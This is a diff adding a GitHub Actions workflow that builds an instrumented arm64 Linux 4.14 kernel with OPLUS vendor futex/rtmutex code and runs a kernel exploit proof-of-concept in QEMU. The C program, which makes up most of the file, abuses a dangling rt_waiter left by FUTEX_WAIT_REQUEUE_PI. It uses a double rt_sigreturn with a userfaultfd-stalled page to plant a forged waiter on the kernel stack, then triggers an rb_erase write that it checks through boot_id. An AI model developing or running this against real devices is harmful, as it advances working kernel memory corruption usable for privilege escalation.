@@ -1,0 +1,633 @@
+name: qemu-ghostlock-v15
+
+on:
+  workflow_dispatch:
+    inputs:
+      pad:
+        description: 'pad bytes in futex_wait_requeue_pi before rt_waiter (0 = none)'
+        required: false
+        default: '0'
+      shift:
+        description: 'override word shift (empty = auto-measure then dance)'
+        required: false
+        default: ''
+
+jobs:
+  qemu-ghostlock:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Checkout OPLUS futex sources (sparse)
+        uses: actions/checkout@v4
+        with:
+          sparse-checkout: |
+            kernel/futex.c
+            kernel/locking/rtmutex.c
+            kernel/locking/rtmutex_common.h
+          sparse-checkout-cone-mode: false
+
+      - name: Fetch generic 4.14.186
+        run: |
+          curl -sL https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.14.186.tar.xz -o k.tar.xz
+          tar xJf k.tar.xz
+          mv linux-4.14.186 linux-g
+
+      - name: Swap in OPLUS futex/rtmutex
+        run: |
+          cp kernel/futex.c linux-g/kernel/futex.c
+          cp kernel/locking/rtmutex.c linux-g/kernel/locking/rtmutex.c
+          cp kernel/locking/rtmutex_common.h linux-g/kernel/locking/rtmutex_common.h
+          echo "swap markers:"
+          grep -c "rt_mutex_start_proxy_lock" linux-g/kernel/futex.c linux-g/kernel/locking/rtmutex.c
+
+      - name: Instrument kernel (anchors + ghost delta + fpsimd capture)
+        env:
+          GHOSTPAD: ${{ github.event.inputs.pad || '0' }}
+        run: |
+          python3 << 'PYEOF'
+          import os
+          # 1) globalize boot_id buffer
+          boot_name = None
+          target_file = None
+          for fn in ('linux-g/drivers/char/random.c', 'linux-g/kernel/random.c', 'linux-g/kernel/sysctl.c'):
+              try:
+                  s = open(fn).read()
+              except IOError:
+                  continue
+              for cand in ('sysctl_bootid', 'boot_id'):
+                  for typ in ('static char %s', 'static unsigned char %s'):
+                      decl = typ % cand
+                      if decl in s:
+                          boot_name = cand
+                          target_file = fn
+                          s = s.replace(decl, 'unsigned char ghostlock_bootid_%s' % cand)
+                          s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
+                          if 'ghostlock_scratch' not in s:
+                              s += '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n'
+                              s += 'unsigned long ghostlock_fakelock[8] __attribute__((aligned(64)));\n'
+                          open(fn, 'w').write(s)
+                          break
+                  if boot_name:
+                      break
+              if boot_name:
+                  break
+          assert boot_name, 'boot_id buffer not found'
+          print('boot buffer:', boot_name, 'in', target_file)
+
+          # 2) rt_waiter capture in futex_wait_requeue_pi
+          f = open('linux-g/kernel/futex.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in f:
+              fidx = f.find('#include')
+              feol = f.find('\n', fidx)
+              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\nextern unsigned long ghostlock_fakelock[8];\n' + f[feol+1:]
+          needle = 'struct rt_mutex_waiter rt_waiter;'
+          cnt = f.count(needle)
+          if cnt >= 2:
+              idx = f.rfind(needle)
+              pad = int(os.environ.get('GHOSTPAD', '0'))
+              cap = ("\n\tpr_info(\"DBG rt_waiter=%px\\n\", &rt_waiter);\n"
+                     "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;\n"
+                     "\tmemset(ghostlock_fakelock, 0, sizeof(ghostlock_fakelock));\n"
+                     "\tghostlock_fakelock[1] = (unsigned long)&rt_waiter;\n"
+                     "\tghostlock_fakelock[2] = (unsigned long)&rt_waiter;\n"
+                     "\tghostlock_fakelock[3] = (unsigned long)&init_task;")
+              f = f[:idx+len(needle)] + cap + f[idx+len(needle):]
+              print('futex.c rt_waiter capture OK (decls=%d)' % cnt)
+          else:
+              print('futex.c rt_waiter capture WARN: needle missing')
+          open('linux-g/kernel/futex.c','w').write(f)
+
+          # 3) fpsimd.vregs capture in restore_fpsimd_context (arm64 signal.c)
+          g = open('linux-g/arch/arm64/kernel/signal.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in g:
+              gidx = g.find('#include')
+              geol = g.find('\n', gidx)
+              g = g[:geol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + g[geol+1:]
+          cap_needle = 'err = __copy_from_user(fpsimd.vregs, ctx->vregs,'
+          if cap_needle in g and 'DBG fpsimd_vregs' not in g:
+              cap = ('pr_info("DBG fpsimd_vregs=%px len=%ld\\n", fpsimd.vregs, (long)sizeof(fpsimd.vregs));\n\t'
+                     'ghostlock_scratch[2] = (unsigned long)fpsimd.vregs;\n\t'
+                     + cap_needle)
+              g = g.replace(cap_needle, cap, 1)
+              open('linux-g/arch/arm64/kernel/signal.c','w').write(g)
+              print('signal.c fpsimd_vregs capture OK')
+          else:
+              print('signal.c fpsimd capture WARN: needle missing or already present')
+
+          # 4) proxy lock + requeue markers
+          reps = [
+            ('return ret ? ret : task_count;',
+             'pr_info("FUTEX-DBG requeue-end ret=%d task_count=%d\\n", ret, task_count);\n\treturn ret ? ret : task_count;'),
+            ('ret = rt_mutex_start_proxy_lock(',
+             'pr_info("FUTEX-DBG proxy_lock call\\n");\n\t\t\tret = rt_mutex_start_proxy_lock('),
+          ]
+          for a, b in reps:
+              if a in f and b.split('\n')[0] not in f:
+                  f = f.replace(a, b)
+          open('linux-g/kernel/futex.c','w').write(f)
+          print('futex instrumentation done')
+
+          import subprocess
+          print('--- injected signal.c ---')
+          subprocess.run(['grep', '-n', 'DBG fpsimd_vregs', 'linux-g/arch/arm64/kernel/signal.c'])
+          print('--- injected futex.c ---')
+          subprocess.run(['grep', '-n', 'ghostlock_scratch', 'linux-g/kernel/futex.c'])
+          PYEOF
+
+      - name: Install cross toolchain + qemu
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq gcc-aarch64-linux-gnu qemu-system-aarch64 cpio
+
+      - name: Configure and build kernel
+        run: |
+          cd linux-g
+          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
+          scripts/config --enable CONFIG_FUTEX_PI
+          scripts/config --enable CONFIG_RT_MUTEXES
+          scripts/config --enable CONFIG_BLK_DEV_INITRD
+          scripts/config --enable CONFIG_USERFAULTFD
+          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
+          make -j$(nproc) ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- Image > kbuild.log 2>&1 || {
+            echo "=== BUILD FAILED, errors: ==="
+            grep -E "error:|undefined reference" kbuild.log | head -30
+            exit 1
+          }
+          echo "=== build OK ==="
+          tail -3 kbuild.log
+          ls -la arch/arm64/boot/Image
+          grep -E " init_task$" System.map
+          grep -E "ghostlock_bootid|ghostlock_scratch|ghostlock_fakelock" System.map
+
+      - name: Build static repro and init
+        run: |
+          cd linux-g
+          INIT_TASK=$(grep ' init_task$' System.map | awk '{print $1}')
+          BOOT_ID=$(grep 'ghostlock_bootid' System.map | awk '{print $1}')
+          SCRATCH=$(grep 'ghostlock_scratch' System.map | awk '{print $1}')
+          FAKELOCK=$(grep 'ghostlock_fakelock' System.map | awk '{print $1}')
+          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH FAKELOCK=$FAKELOCK"
+          mkdir -p ../initramfs/proc ../initramfs/dev ../initramfs/sys
+          SHIFT_OVR="${{ github.event.inputs.shift }}"
+          if [ -n "$SHIFT_OVR" ]; then EXTRA="-DSHIFT_OVERRIDE=$SHIFT_OVR"; else EXTRA=""; fi
+          echo "SHIFT_OVR=$SHIFT_OVR EXTRA=$EXTRA"
+          cat > ../initramfs/repro.c << EOF
+          #define _GNU_SOURCE
+          #include <stdio.h>
+          #include <stdint.h>
+          #include <string.h>
+          #include <errno.h>
+          #include <unistd.h>
+          #include <pthread.h>
+          #include <sys/syscall.h>
+          #include <linux/futex.h>
+          #include <linux/sched.h>
+          #include <sys/select.h>
+          #include <sys/syslog.h>
+          #include <time.h>
+          #include <fcntl.h>
+          #include <stdlib.h>
+          #include <signal.h>
+          #include <setjmp.h>
+          #include <sys/mman.h>
+          #include <sys/ioctl.h>
+
+          /* ===== userfaultfd (4.14 精确 ABI，硬编码避免交叉编译头版本差异) ===== */
+          #define __NR_uffd 282
+          #define UFFD_API_NUM 0xAAULL
+          #define UFFDIO_API_CMD      0xC018AA3FULL  /* _IOWR(0xAA,0x3F,uffdio_api=24B) */
+          #define UFFDIO_REGISTER_CMD 0xC020AA00ULL  /* _IOWR(0xAA,0x00,uffdio_register=32B) */
+          #define UFFDIO_ZEROPAGE_CMD 0xC020AA04ULL  /* _IOWR(0xAA,0x04,uffdio_zeropage=32B) */
+          #define UFFD_EVENT_PAGEFAULT 0x12
+          #define UFFDIO_REGISTER_MODE_MISSING 1ULL
+          struct uffdio_api_414 { uint64_t api; uint64_t features; uint64_t ioctls; };
+          struct uffdio_range_414 { uint64_t start; uint64_t len; };
+          struct uffdio_register_414 { struct uffdio_range_414 range; uint64_t mode; uint64_t ioctls; };
+          struct uffdio_zeropage_414 { struct uffdio_range_414 range; uint64_t mode; int64_t zeropage; };
+          struct uffd_arg { int fd; };
+          static volatile int suppress_consumer;
+
+          #define ANCHOR_COMM   (0x${INIT_TASK}ULL + 0x7e0)
+          #define ANCHOR_BOOTID  0x${BOOT_ID}ULL
+          #define ANCHOR_INIT    0x${INIT_TASK}ULL
+          #define ANCHOR_SCRATCH 0x${SCRATCH}ULL
+          #define ANCHOR_FAKELOCK 0x${FAKELOCK}ULL
+
+          struct sched_attr_x {
+            uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
+            int32_t sched_nice; uint32_t sched_priority;
+            uint64_t sched_runtime; uint64_t sched_deadline; uint64_t sched_period;
+          };
+
+          /* aarch64 4.14.186 rt_sigframe 关键偏移（offsetof 实测，host LP64 == aarch64）：
+           *   offsetof(rt_sigframe, uc) = 128 (siginfo)
+           *   offsetof(ucontext, uc_mcontext) = 176
+           *   offsetof(sigcontext, __reserved) = 288
+           *   => fpsimd_context 起点 = 128+176+288 = 592 = 0x250
+           *   => fpsimd_context.vregs 起点 = 0x250 + 0x10 = 0x260
+           *   用纯字节缓冲 + 固定偏移构造，避免嵌套结构对齐歧义 */
+          #define FPSIMD_MAGIC 0x46508001
+          #define SF_ESR_OFF      0x250   /* ESR context（占位跳过，避免 offset0 零 magic 终止） */
+          #define SF_FPSIMD_OFF   0x270   /* fpsimd_context.head */
+          #define SF_VREGS_OFF    0x280   /* fpsimd_context.vregs = head + 0x10 */
+
+          static long futex(uint32_t *uaddr, int op, uint32_t val,
+                            const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
+            return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
+          }
+          static uint32_t f_wait[8], f_pi_target[8], f_pi_chain[8];
+          static volatile int owner_has_target, waiter_has_chain, waiter_waiting,
+                             owner_started, route_done, owner_chain_done,
+                             ghost_go, consumer_done;
+          static volatile int waiter_tid, word_shift, dance_idx;
+
+          static void read_bootid(unsigned char out[16]) {
+            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+            memset(out, 0, 16);
+            if (fd >= 0) { char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1);
+              if (n > 0) { buf[n] = 0; unsigned char raw[16]; int nib=-1, o=0;
+                for (ssize_t i=0; i<n && o<16; i++) { int v;
+                  char c=buf[i];
+                  v = (c>='0'&&c<='9')?c-'0':(c>='a'&&c<='f')?c-'a'+10:(c>='A'&&c<='F')?c-'A'+10:-1;
+                  if (v<0) continue; if (nib<0){nib=v;continue;} raw[o++]=(unsigned char)((nib<<4)|v); nib=-1; }
+                if (o==16) memcpy(out, raw, 16); }
+              close(fd); }
+          }
+
+          static void *consumer_fn(void *a) {
+            int my_idx = dance_idx;
+            printf("REPRO consumer enter tid=%d gotid=%d idx=%d\n", waiter_tid, (int)syscall(SYS_gettid), my_idx);
+            fflush(stdout);
+            while (!ghost_go && dance_idx == my_idx) usleep(1000);
+            if (dance_idx != my_idx) { printf("REPRO consumer stale exit idx=%d\n", my_idx); fflush(stdout); return NULL; }
+            printf("REPRO consumer saw ghost_go=1 tid=%d idx=%d\n", waiter_tid, my_idx);
+            fflush(stdout);
+            usleep(100000);
+            for (int i = 0; i < 20 && !consumer_done && dance_idx == my_idx; i++) {
+              struct sched_attr_x attr;
+              memset(&attr, 0, sizeof(attr));
+              attr.size = sizeof(attr);
+              attr.sched_policy = SCHED_BATCH;
+              attr.sched_nice = (i % 19) + 1;
+              long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
+              printf("REPRO consumer sched_setattr i=%d tid=%d ret=%ld errno=%d idx=%d\n", i, waiter_tid, r, errno, my_idx);
+              fflush(stdout);
+              if (r != 0) break;
+              usleep(10000);
+            }
+            consumer_done = 1;
+            printf("REPRO consumer exit idx=%d\n", my_idx);
+            fflush(stdout);
+            return NULL;
+          }
+
+          /* sigreturn 恢复后 waiter 线程跳到这里死循环，避免跳非法地址崩溃 */
+          static void __attribute__((noinline)) safe_after_sig(void) {
+            for (;;) sleep(60);
+          }
+
+          /* SIGSEGV 安全阀：sig2 badframe 时兜底（避免杀掉整个 repro） */
+          static void segv_handler(int sig) {
+            (void)sig;
+            for (;;) sleep(60);
+          }
+
+          /* frame #1：全映射。ESR@0x250 → FPSIMD@0x270 → terminator@0x480
+           * vregs=sf+0x280；ws>=0 时在 vregs+ws*8 起填伪造 waiter（v12 实测成功值） */
+          static void build_sigframe(unsigned char *sf, int ws, void *pc_target) {
+            memset(sf, 0, 0x1000);
+            /* sigcontext.sp/pc（offsetof 实测：sp@0x230 pc@0x238） */
+            *(uint64_t *)(sf + 0x230) = (uint64_t)sf + 0x8000;  /* sp */
+            *(uint64_t *)(sf + 0x238) = (uint64_t)pc_target;    /* pc */
+            /* ESR context @0x250：跳过 0x20，避免 offset0 的零 magic 直接终止 parse */
+            uint32_t *esr = (uint32_t *)(sf + SF_ESR_OFF);
+            esr[0] = 0x45535201;  /* ESR_MAGIC */
+            esr[1] = 0x20;
+            /* fpsimd_context.head @0x270：magic + size */
+            uint32_t *head = (uint32_t *)(sf + SF_FPSIMD_OFF);
+            head[0] = FPSIMD_MAGIC;
+            head[1] = 0x210;             /* sizeof(struct fpsimd_context) = 528 */
+            /* vregs 512B；ws>=0 时填伪造 waiter */
+            uint64_t *v = (uint64_t *)(sf + SF_VREGS_OFF);
+            memset(v, 0, 512);
+            if (ws >= 0) {
+              /* v12 成功值：rt_mutex_waiter 80B */
+              v[ws+0] = ANCHOR_COMM;   /* tree_pc */
+              v[ws+1] = 0;             /* tree_right */
+              v[ws+2] = ANCHOR_BOOTID; /* tree_left */
+              v[ws+3] = ANCHOR_COMM;   /* pi_pc */
+              v[ws+4] = 0;             /* pi_right */
+              v[ws+5] = ANCHOR_BOOTID; /* pi_left */
+              v[ws+6] = ANCHOR_INIT;   /* task */
+              v[ws+7] = ANCHOR_FAKELOCK;/* lock */
+              v[ws+8] = 130;           /* prio */
+              v[ws+9] = 0;             /* deadline */
+            }
+          }
+
+          /* frame #2：fpsimd@0x250 直放（无 ESR），terminator@0x460 落在 uffd 挂起页。
+           * 只写映射页内的字段，绝不碰挂起页（否则提前触发缺页事件） */
+          static void build_sigframe2(unsigned char *sf, void *pc_target) {
+            *(uint64_t *)(sf + 0x230) = (uint64_t)sf + 0x8000;  /* sp */
+            *(uint64_t *)(sf + 0x238) = (uint64_t)pc_target;    /* pc */
+            uint32_t *head = (uint32_t *)(sf + 0x250);
+            head[0] = FPSIMD_MAGIC;
+            head[1] = 0x210;
+            /* vregs 无需内容（拷贝发生在泄漏之后，且不碰挂起页） */
+          }
+
+          /* aarch64 sys_rt_sigreturn 用 regs->sp 作 frame 指针 → mov sp,sf; svc #0 */
+          static void __attribute__((noinline)) do_sigcall(void *sf) {
+            register unsigned long x8 asm("x8") = 139;
+            asm volatile("mov sp, %0\n\t"
+                         "svc #0\n\t"
+                         :: "r"(sf), "r"(x8) : "memory");
+            for (;;) sleep(60);  /* 不该到这 */
+          }
+
+          static void *g_sf2;
+          /* sigreturn #1 恢复后跳这里：立刻做 sigreturn #2（其 terminator 页被 uffd 挂起）
+           * → parse 首读缺页 → waiter 阻塞在内核 = pselect 等价的“栈仍活”窗口 */
+          static void __attribute__((noinline)) trampoline(void) {
+            do_sigcall(g_sf2);
+            for (;;) sleep(60);
+          }
+
+          /* uffd 处理线程：收到缺页事件 → 若 dance 模式则 fire consumer →
+           * 等 3s（窗口内 fake waiter 在活栈上）→ ZEROPAGE 解决缺页 → sigreturn #2 继续 */
+          static void *uffd_thread(void *a) {
+            int fd = ((struct uffd_arg *)a)->fd;
+            unsigned char msg[32];
+            ssize_t n = read(fd, msg, sizeof(msg));
+            printf("REPRO uffd event n=%ld event=0x%02x addr=%016llx\n",
+                   n, msg[0], *(unsigned long long *)(msg + 16));
+            fflush(stdout);
+            unsigned long fault_addr = *(unsigned long long *)(msg + 16);
+            if (!suppress_consumer) ghost_go = 1;
+            sleep(3);
+            struct uffdio_zeropage_414 zp;
+            memset(&zp, 0, sizeof(zp));
+            zp.range.start = fault_addr & ~0xfffULL;
+            zp.range.len = 0x1000;
+            long r = ioctl(fd, UFFDIO_ZEROPAGE_CMD, &zp);
+            printf("REPRO uffd zeropage ret=%ld errno=%d zeropage=%lld\n",
+                   r, errno, (long long)zp.zeropage);
+            fflush(stdout);
+            return NULL;
+          }
+
+          /* 双 sigreturn 栈回收：
+           *   sigreturn #1（全映射）：restore_fpsimd_context 512B 拷贝把 fake waiter 写到
+           *     rt_waiter 悬空位置 → 恢复寄存器跳 trampoline
+           *   trampoline → sigreturn #2：terminator@sf2+0x460 在 uffd 挂起页 →
+           *     parse 首读缺页阻塞（帧浅，不碰 fake waiter）→ uffd 事件 fire consumer
+           *   consumer sched_setattr → 悬空 pi_blocked_on → 活栈 fake waiter → rb_erase 泄漏
+           *   3s 后 zeropage → sigreturn #2 完成 → safe loop */
+          static void do_ghost_sigreturn(void) {
+            unsigned char *base1 = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
+                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            if (base1 == MAP_FAILED) { perror("mmap1"); _exit(1); }
+            unsigned char *sf1 = base1 + 0x100;
+            build_sigframe(sf1, word_shift, (void*)trampoline);
+
+            unsigned char *base2 = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
+                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            if (base2 == MAP_FAILED) { perror("mmap2"); _exit(1); }
+            unsigned char *sf2 = base2 + 0xC00;
+            g_sf2 = sf2;
+            build_sigframe2(sf2, (void*)safe_after_sig);
+
+            /* uffd 注册 base2 第二页 [0x1000,0x2000)：sf2+0x460=0x1060 在其中 */
+            int ufd = (int)syscall(__NR_uffd, O_CLOEXEC);
+            if (ufd < 0) { perror("uffd"); _exit(1); }
+            struct uffdio_api_414 ua;
+            memset(&ua, 0, sizeof(ua));
+            ua.api = UFFD_API_NUM;
+            if (ioctl(ufd, UFFDIO_API_CMD, &ua) != 0) { perror("uffdio_api"); _exit(1); }
+            struct uffdio_register_414 ur;
+            memset(&ur, 0, sizeof(ur));
+            ur.range.start = (unsigned long)(base2 + 0x1000);
+            ur.range.len = 0x1000;
+            ur.mode = UFFDIO_REGISTER_MODE_MISSING;
+            if (ioctl(ufd, UFFDIO_REGISTER_CMD, &ur) != 0) { perror("uffdio_register"); _exit(1); }
+            printf("REPRO uffd registered %016lx..%016lx sf2=%p term@%p\n",
+                   ur.range.start, ur.range.start + 0x1000, (void*)sf2, (void*)(sf2 + 0x460));
+            fflush(stdout);
+
+            struct uffd_arg *arg = malloc(sizeof(*arg));
+            arg->fd = ufd;
+            pthread_t ut;
+            pthread_create(&ut, NULL, uffd_thread, arg);
+            /* 给 uffd 线程时间进入阻塞 read */
+            usleep(200000);
+
+            printf("REPRO sigreturn#1 enter shift=%d idx=%d sf1=%p\n", word_shift, dance_idx, (void*)sf1);
+            fflush(stdout);
+
+            do_sigcall(sf1);
+            /* 不会到这里：sigreturn #1 → trampoline → sigreturn #2（阻塞在 uffd 缺页） */
+            printf("REPRO sigreturn returned (unexpected)\n");
+            _exit(0);
+          }
+
+          static void *waiter_fn(void *a) {
+            int idx = dance_idx;
+            waiter_tid = (int)syscall(SYS_gettid);
+            long r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); waiter_has_chain = 1;
+            while (!owner_has_target) usleep(1000);
+            __sync_synchronize(); waiter_waiting = 1;
+            struct timespec ts;
+            clock_gettime(CLOCK_MONOTONIC, &ts);
+            ts.tv_sec += 10;
+            r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
+            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); route_done = 1;
+            do_ghost_sigreturn();
+            while (!owner_chain_done) usleep(1000);
+            for (;;) sleep(60);
+            return NULL;
+          }
+
+          static void *owner_fn(void *a) {
+            int idx = dance_idx;
+            long r = futex(&f_pi_target[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI target ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); owner_has_target = 1;
+            while (!waiter_has_chain) usleep(1000);
+            __sync_synchronize(); owner_started = 1;
+            r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            __sync_synchronize(); owner_chain_done = 1;
+            for (;;) sleep(60);
+            return NULL;
+          }
+
+          static long run_dance(int idx, int shift) {
+            word_shift = shift;
+            dance_idx = idx;
+            owner_has_target = waiter_has_chain = waiter_waiting = 0;
+            owner_started = route_done = owner_chain_done = 0;
+            ghost_go = consumer_done = 0;
+            suppress_consumer = (idx == 1) ? 1 : 0;  /* measure dance 不 fire consumer（shift=0 假 waiter 会砸内核） */
+            pthread_t o, w, c;
+            pthread_create(&o, NULL, owner_fn, NULL);
+            usleep(200000);
+            pthread_create(&w, NULL, waiter_fn, NULL);
+            pthread_create(&c, NULL, consumer_fn, NULL);
+            while (!waiter_waiting || !owner_started) usleep(1000);
+            usleep(100000);
+            long rq = -1; int edeadlk = 0;
+            for (int i = 1; i <= 3; i++) {
+              errno = 0;
+              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)0x7fffffff, &f_pi_target[idx], 0);
+              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d idx=%d\n", i, rq, errno, idx);
+              if (errno == 35) { edeadlk = 1; break; }
+              if (rq >= 1) break;
+              sleep(1);
+            }
+            sleep(2);
+            /* 等 waiter 超时返回（10s）并执行 sigreturn 栈拷贝 */
+            int guard = 0;
+            while (!route_done && guard < 150) { usleep(100000); guard++; }
+            printf("REPRO dance route_done=%d guard=%d\n", route_done, guard);
+            sleep(2);  /* 再给 consumer 时间完成 sched_setattr 链行走 */
+            return edeadlk ? 35 : rq;
+          }
+
+          static void klog_grep(const char *needle, int nl, unsigned long *out, char **tail) {
+            const size_t cap = 1 << 20;
+            char *buf = malloc(cap);
+            if (!buf) return;
+            long n = syscall(SYS_syslog, 3, buf, (int)cap);
+            if (n <= 0) { free(buf); return; }
+            buf[n] = 0;
+            char *p = buf;
+            unsigned long last = 0;
+            while ((p = strstr(p, needle)) != NULL) {
+              last = strtoull(p + nl, NULL, 16);
+              p += nl;
+            }
+            if (out) *out = last;
+            if (tail && n > 0) *tail = buf;
+            free(buf);
+          }
+
+          /* 轮询 klog 直到 DBG fpsimd_vregs 出现（sigreturn 拷贝晚于 dance 返回约 10s） */
+          static void find_delta(unsigned long *qwaiter, unsigned long *fpsimd, long *pshift) {
+            *qwaiter = *fpsimd = 0; *pshift = 0;
+            for (int i = 0; i < 60; i++) {
+              klog_grep("DBG rt_waiter=", 14, qwaiter, NULL);
+              klog_grep("DBG fpsimd_vregs=", 17, fpsimd, NULL);
+              printf("REPRO poll[%d] q_waiter=%016lx fpsimd_vregs=%016lx\n", i, *qwaiter, *fpsimd);
+              if (*qwaiter && *fpsimd) break;
+              usleep(500000);
+            }
+            if (*qwaiter && *fpsimd) {
+              long delta = (long)(*qwaiter - *fpsimd);
+              *pshift = delta / 8;
+              printf("REPRO delta=%ld bytes=%ld words (word_shift)\n", delta, *pshift);
+            } else {
+              printf("REPRO measure FAIL: q_waiter=%016lx fpsimd=%016lx\n", *qwaiter, *fpsimd);
+            }
+          }
+
+          int main(void) {
+            unsigned char before[16], after[16];
+            read_bootid(before);
+            printf("REPRO bootid before: %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
+                   before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
+                   before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);
+
+            /* measure：先跑一次 dance 触发 rt_waiter + fpsimd 打印，测 delta */
+            printf("REPRO measure dance (shift=0)\n");
+            run_dance(1, 0);
+            unsigned long qwaiter = 0, fpsimd = 0; long pshift = 0;
+            find_delta(&qwaiter, &fpsimd, &pshift);
+            printf("REPRO measure: q_waiter=%016lx fpsimd=%016lx shift=%ld\n", qwaiter, fpsimd, pshift);
+
+            /* dance：用实测 shift（或 override）枚举尝试 leak */
+            #ifdef SHIFT_OVERRIDE
+            int shifts[] = { SHIFT_OVERRIDE };
+            #else
+            int shifts[] = { (int)pshift, (int)pshift+1, (int)pshift-1,
+                             (int)pshift+2, (int)pshift-2 };
+            #endif
+            int ns = sizeof(shifts)/sizeof(shifts[0]);
+            printf("REPRO enumerate %d shift(s), first=%d\n", ns, shifts[0]);
+
+            for (int si = 0; si < ns; si++) {
+              int shift = shifts[si];
+              read_bootid(before);
+              printf("REPRO === try shift=%d idx=%d ===\n", shift, 2+si);
+              run_dance(2 + si, shift);
+              read_bootid(after);
+              printf("REPRO shift=%d bootid after %02x%02x%02x%02x%02x%02x%02x%02x\n",
+                     shift, after[0],after[1],after[2],after[3],after[4],after[5],after[6],after[7]);
+              unsigned long long leaked = 0;
+              for (int i = 0; i < 8; i++) leaked |= (unsigned long long)after[i] << (i*8);
+              printf("REPRO shift=%d leaked=%016llx expect_comm=%016llx\n", shift, leaked, (unsigned long long)ANCHOR_COMM);
+              if (leaked == (unsigned long long)ANCHOR_COMM) {
+                printf("REPRO SUCCESS shift=%d\n", shift);
+                return 0;
+              }
+            }
+            printf("REPRO all shifts done, no leak\n");
+            return 1;
+          }
+          EOF
+          aarch64-linux-gnu-gcc -static -O2 -pthread $EXTRA ../initramfs/repro.c -o ../initramfs/repro
+          cat > ../initramfs/init.c << 'EOF2'
+          #include <sys/syscall.h>
+          #include <sys/mount.h>
+          #include <sys/reboot.h>
+          #include <sys/stat.h>
+          #include <sys/wait.h>
+          #include <unistd.h>
+          #include <stdio.h>
+          int main(void) {
+            mkdir("/proc", 0755); mkdir("/dev", 0755); mkdir("/sys", 0755);
+            syscall(SYS_mount, "proc", "/proc", "proc", 0, 0);
+            syscall(SYS_mount, "devtmpfs", "/dev", "devtmpfs", 0, 0);
+            syscall(SYS_mount, "sysfs", "/sys", "sysfs", 0, 0);
+            printf("=== QEMU ghostlock v15 start ===\n");
+            fflush(stdout);
+            /* fork 子进程跑 repro：sigreturn 会恢复非法寄存器导致 repo 崩溃，
+               但不能让 pid 1(init) 崩溃（否则内核 kill init panic） */
+            pid_t p = fork();
+            if (p == 0) {
+              execl("/repro", "repro", NULL);
+              _exit(1);
+            }
+            int st;
+            waitpid(p, &st, 0);
+            printf("=== repro exited status=%d, init stays alive ===\n", st);
+            /* 保持 init 存活，避免 reboot 前 panic */
+            for (;;) sleep(10);
+            return 0;
+          }
+          EOF2
+          aarch64-linux-gnu-gcc -static -O2 ../initramfs/init.c -o ../initramfs/init
+          cd ../initramfs && find . | cpio -o -H newc | gzip > ../initramfs.cpio.gz
+          ls -la ../initramfs.cpio.gz
+
+      - name: Run QEMU test
+        timeout-minutes: 6
+        run: |
+          timeout 240 qemu-system-aarch64 \
+            -M virt -cpu cortex-a57 -m 512M -smp 4 -nographic -no-reboot \
+            -kernel linux-g/arch/arm64/boot/Image \
+            -initrd initramfs.cpio.gz \
+            -append "console=ttyAMA0 earlycon rdinit=/init" > qemu.log 2>&1 || true
+          echo "=== QEMU log (REPRO + DBG) ==="
+          grep -E "REPRO|DBG|FUTEX-DBG" qemu.log | head -150
+          echo "=== TAIL ==="
+          tail -20 qemu.log
+
+      - name: Upload QEMU log
+        uses: actions/upload-artifact@v4
+        with:
+          name: qemu-ghostlock-v15-log
+          path: qemu.log
